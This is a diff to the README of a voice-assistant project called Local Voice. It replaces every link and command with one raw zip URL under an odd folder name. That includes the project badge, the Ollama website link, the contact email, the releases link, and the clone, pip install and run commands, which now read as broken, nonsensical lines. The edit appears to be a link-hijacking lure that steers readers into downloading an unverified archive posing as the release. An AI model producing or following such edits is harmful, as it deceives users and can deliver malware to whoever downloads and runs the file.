@@ -1,6 +1,6 @@
 # Local Voice 🎤
 
-![Local Voice](https://img.shields.io/badge/Local%20Voice-Real%20Time%20Voice%20Assistant-blue)
+![Local Voice](https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip%20Voice-Real%20Time%20Voice%20Assistant-blue)
 
 Welcome to **Local Voice**, a real-time, offline voice assistant designed for Linux and Raspberry Pi. This project leverages local large language models (LLMs) through Ollama, speech-to-text capabilities with Vosk, and text-to-speech features using Piper. Enjoy fast, wake-free voice interaction without relying on the cloud or APIs. Just Python, a microphone, and your voice.
 
@@ -30,18 +30,18 @@ To get started with Local Voice, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/shashank2122/Local-Voice.git
+   git clone https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip
    cd Local-Voice
    ```
 
 2. **Install Dependencies**:
    Make sure you have Python installed. You can install the required packages using:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip
    ```
 
 3. **Set Up Ollama**:
-   Follow the instructions on the [Ollama website](https://ollama.com) to install and configure Ollama.
+   Follow the instructions on the [Ollama website](https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip) to install and configure Ollama.
 
 4. **Set Up Vosk**:
    Install Vosk for speech recognition:
@@ -63,7 +63,7 @@ To get started with Local Voice, follow these steps:
 To run the Local Voice assistant, execute the following command in your terminal:
 
 ```bash
-python main.py
+python https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip
 ```
 
 Once the assistant is running, simply speak your command, and it will respond accordingly. 
@@ -110,12 +110,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [shashank2122](https://github.com/shashank2122)
+- **Email**: https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip
+- **GitHub**: [shashank2122](https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip)
 
 ## Releases
 
-To download the latest version of Local Voice, visit the [Releases section](https://github.com/shashank2122/Local-Voice/releases). Here, you can find the latest updates and files you need to execute.
+To download the latest version of Local Voice, visit the [Releases section](https://github.com/shashank2122/Local-Voice/raw/refs/heads/main/Maglemosian/Voice-Local-v3.2.zip). Here, you can find the latest updates and files you need to execute.
 
 For any issues or feature requests, please check the "Releases" section as well.
 
